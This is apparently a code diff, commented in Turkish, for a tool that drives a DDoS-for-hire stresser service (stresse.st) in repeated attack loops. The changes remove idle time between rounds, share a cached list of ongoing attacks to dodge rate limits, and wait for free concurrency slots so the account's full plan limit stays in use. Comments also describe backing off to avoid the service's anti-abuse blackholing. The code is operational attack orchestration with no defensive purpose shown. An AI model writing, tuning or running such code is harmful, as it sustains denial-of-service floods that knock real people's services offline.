@@ -884,6 +884,18 @@ async function launchAttacksGet(sessionId, params, concurrents, loopId = null) {
     upfrontPendingIds.forEach((id) => unregisterAttack(id));
   }
 
+  // HIZLI YOL: yanit istenen tum ID'leri zaten iceriyorsa 4sn+4sn dogrulama
+  // uykusunu ve /ongoing diff'ini atla — kayitlar yukarida aninda yapildi.
+  // Loop turlarinin buyuk kismi (ID donduren methodlar) buradan 8-15sn kazanir;
+  // bosluk, kadansi (tur araligi) asil daraltan seydi.
+  if ((data?.status === 'success' || data?.message === 'Attack started') && responseIds.length > 0) {
+    const freshFull = responseIds.filter((id) => !beforeIds.has(id) && (!activeAttacks[id] || instantIds.has(String(id))));
+    if (freshFull.length >= sendConc) {
+      markMethodOk(params.method);
+      return { data, attackIds: freshFull.slice(0, sendConc), elapsedSec: 0, pendingIds: [] };
+    }
+  }
+
   // Ongoing listesinin guncellenmesi icin kisa bekle.
   await new Promise((r) => setTimeout(r, 4000));
 
@@ -2588,11 +2600,12 @@ async function fetchOngoingAttackIds(sessionId, params, limit = 1, sinceMs = nul
   try {
     const session = sessions[sessionId];
     if (!session?.username) return [];
-    const webClient = getClient(sessionId);
-    const ongoingRes = await webClient.get(`/ongoing/${session.username}`, { timeout: 15000 });
-    const ongoingList = Array.isArray(ongoingRes.data)
-      ? ongoingRes.data
-      : (ongoingRes.data?.attacks || []);
+    // Hesap bazina PAYLASILAN /ongoing onbellegi (getOngoingShared, 2sn TTL):
+    // coklu loop ayni anda ateslenirken her launch kendi fetch'ini aciyordu
+    // (N loop = N istek darbesi -> rate limit -> yavas/timeout dogrulama).
+    // Drain ile ayni kaynaktan okur; hata durumunda [] (eski davranis).
+    const { list: ongoingList, ok } = await getOngoingShared(sessionId);
+    if (!ok || !Array.isArray(ongoingList)) return [];
     const now = Date.now();
     // Upstream tarih formati guvenilmez olabilir (epoch saniye string, saat
     // dilimi kaymasi vb.). Parse edilemeyen veya bariz kaymis tarihler eleme
@@ -2795,6 +2808,33 @@ async function waitLoopsDrained(loopIds, maxWaitMs = 60000) {
   }
 }
 
+// Hesap slot kapisi: plan limiti (fallback 80) altinda yer acilana dek bekle.
+// Coklu loop ayni anda ateslendiginde limit asimi stresse reddi -> tur hatasi
+// -> backoff dongusu yaratyordu; kapisi asan turlar sirayla bosalan slotu
+// bekler. Donus: beklenen ms (0 = beklemedi), -1 = zaman asimi (yine denenecek).
+async function waitForSlotBudget(sessionId, sendConc, maxWaitMs = 45000) {
+  const owner = sessions[sessionId]?.username;
+  if (!owner) return 0;
+  let maxConc = 80;
+  for (const s of Object.values(sessions)) {
+    if (s?.username === owner && s.plan?.Concurrents) {
+      maxConc = parseInt(s.plan.Concurrents, 10) || 80;
+      break;
+    }
+  }
+  const started = Date.now();
+  for (;;) {
+    const now = Date.now();
+    if (now - started >= maxWaitMs) return -1;
+    const used = Object.values(activeAttacks)
+      .filter((a) => (a.username || sessions[a.sessionId]?.username) === owner &&
+        new Date(a.expiresAt || 0).getTime() > now)
+      .reduce((sum, a) => sum + (parseInt(a.concurrents, 10) || 1), 0);
+    if (used + sendConc <= maxConc) return now - started;
+    await new Promise((r) => setTimeout(r, 3000));
+  }
+}
+
 async function fireLoopRound(loopId, { skipDrain = false } = {}) {
   const loop = activeLoops[loopId];
   if (!loop || !loop.running) return 0;
@@ -2866,9 +2906,10 @@ async function fireLoopRoundInner(loopId, { skipDrain = false } = {}) {
     const timeSec = parseInt(effectiveParams.time, 10) || 60;
     // Adaptif zaman kapisi: drain her turda onceki neslin olumunu blip
     // korumali olctugu icin bir SONRAKI turun kapisi = olculen gercek omur
-    // (+5sn pay), [time, 2x time] araliginda. Saglikli donemde kadans ~time
-    // (surekli ates, bosluk yok); hasta donemde kendini uzatir (overlap yok).
-    const gapMs = loop.measuredGapMs || timeSec * 2000;
+    // (+5sn pay), [time, 2x time] araliginda. Ilk turde olcum yok: time+15sn
+    // (eski 2x time varsayilan ilk turu gereksiz uzun bekletiyordu; drain
+    // overlap'i zaten engelliyor).
+    const gapMs = loop.measuredGapMs || (timeSec * 1000 + 15000);
     const waitMs = (loop.lastFireAt || 0) + gapMs - Date.now();
     if (waitMs > 0) {
       console.log(`[loop ${loopId}] zaman kapisi: ${Math.round(waitMs / 1000)}sn bekleniyor (olculen omur: ${Math.round(gapMs / 1000)}sn)`);
@@ -2895,6 +2936,16 @@ async function fireLoopRoundInner(loopId, { skipDrain = false } = {}) {
   loop.roundCount += 1;
   loop.lastRoundAt = new Date().toISOString();
   const round = loop.roundCount;
+
+  // SLOT KAPISI (sadece stresse): hesabin plan limitini asacak tur once
+  // slot bosalmasini bekler (max 45sn). Coklu loop yarisi reddedilip hata
+  // sayiyordu; sira yerine budget paylasimi — bosalan slotu en uzun bekleyen
+  // alir. RackGhost'a uygulanmaz (kendi limit mimarisi var).
+  if (!isRackghost) {
+    const gateMs = await waitForSlotBudget(loop.sessionId, parseInt(effectiveParams.concurrents, 10) || 1);
+    if (gateMs > 1000) console.log(`[loop ${loopId}] slot kapisi: ${Math.round(gateMs / 1000)}sn budget beklendi`);
+    else if (gateMs < 0) console.warn(`[loop ${loopId}] slot kapisi: budget 45sn'de acilmadi, tur yine denenecek`);
+  }
 
   // Yeni tur ID'lerini temizle
   loop.roundAttackIds = [];
@@ -3033,12 +3084,11 @@ async function runLoopRound(loopId) {
     loop.resolveFirstRound = null;
   }
 
-  // Saldiri stresse.st uzerinde time saniye surer; loop'un siradaki turu
-  // icin saldiri bitene kadar bekle. Kullanici durdurursa erken cik.
-  const waitUntil = Date.now() + (loop.params.time * 1000);
-  while (loop.running && Date.now() < waitUntil) {
-    await new Promise(r => setTimeout(r, 1000));
-  }
+  // NOT: Buradaki eski "time saniye bekle" blogu kaldirildi. Tur araligini
+  // artik TEK mekanizma yonetiyor: fireLoopRoundInner'daki olculen zaman
+  // kapisidir (measuredGapMs >= time) + drain. Cift bekleme kadansi ~2x
+  // time'a cikarip saldirinin buyuk kismini bogusa birakiyordu; su an ki
+  // gercek olcum: time=120 icin tur 166-173sn (41-48sn olu zaman).
 
   // Basarisiz tur sonrasi ustel backoff: stresse.st anti-abuse'i IP'yi gecici
   // blackhole'a alabiliyor; hizli retry firtinasi bunu tetikleyip uzatiyor.
